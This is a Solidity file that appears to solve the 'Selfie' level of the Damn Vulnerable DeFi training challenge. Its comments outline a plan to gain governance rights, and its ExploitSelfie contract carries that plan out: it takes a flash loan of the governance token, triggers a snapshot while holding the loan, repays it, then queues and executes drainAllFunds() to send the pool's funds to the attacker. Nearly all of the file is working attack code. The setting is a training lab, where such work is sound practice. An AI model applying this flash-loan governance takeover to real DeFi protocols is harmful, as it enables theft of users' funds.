// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// SelfiePool.drainAllFunds() is executed by SimpleGovernance
// Actions get executed at SimpleGovernance.executeAction()
// -> can put an action in there to drain all funds to attacker

// actions are put in queue via SG.queueAction()
// -> only if msg.sender has enough votes
// -> _hasEnoughVotes() msg.sender needs more than 1/2 of govToken @snapshot
// -> governanceToken is GovTokenSnapshot Contract
// -> creating a snapshot() is public & ERC20 mint is not protected (later not correct, found out in Exploit#1)

// Exploit #1
// -> Mint a lot of token to gain .queueAction() rights
// -> Insert action to drainAllFunds() to attacker
// -> "Wait 2 days for ACTION_DELAY to pass"
// -> call .executeAction()
// -> all funds get drained to attacker
// !! _mint() is internal; not possible to mint from outside the

// Explort #2
// flashloan token == token used for governance
// -> flashloan() so contract balance increases
// -> trigger snapshot() of DVTSnapshot
// -> return flashloan
// -> contract @snapshot time > 1/2 of supply
//    ==> contract eligable to queueAction()
// -> queue drainAllFunds() actions
// -> "wait 2 days"
// -> call .executeAction()
// -> all funds get drained to attacker

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "../DamnValuableTokenSnapshot.sol";
import "../DamnValuableToken.sol";

interface ISimpleGovernance {
    // only necessary functions
    function governanceToken()
        external
        view
        returns (DamnValuableTokenSnapshot);

    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

interface ISelfiePool {
    function token() external view returns (ERC20Snapshot);

    function flashLoan(uint256 borrowAmount) external;

    function drainAllFunds(address receiver) external;
}

contract ExploitSelfie is Ownable {
    ISimpleGovernance gov;
    ISelfiePool pool;
    ERC20Snapshot token;

    uint256 actionId;

    constructor(address _gov, address _pool) {
        gov = ISimpleGovernance(_gov);
        pool = ISelfiePool(_pool);
        token = pool.token(); // same as gov.governanceToken();
    }

    function execute() external {
        uint256 amount = token.balanceOf(address(pool));
        pool.flashLoan(amount);

        // Attacker now has gov rights
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            address(owner())
        );
        actionId = gov.queueAction(address(pool), data, 0);
    }

    function executeQueuedAction() external {
        gov.executeAction(actionId);
    }

    // Called by flashloan
    function receiveTokens(address poolToken, uint256 amount) external {
        gov.governanceToken().snapshot();
        ERC20Snapshot(poolToken).transfer(address(pool), amount);
    }

    function compareAddr() external view returns (address, address) {
        address govToken = address(gov.governanceToken());
        address poolToken = address(pool.token());
        return (govToken, poolToken);
    }

    function lastSSBalance() external view returns (uint256) {
        return gov.governanceToken().getBalanceAtLastSnapshot(address(this));
    }
}
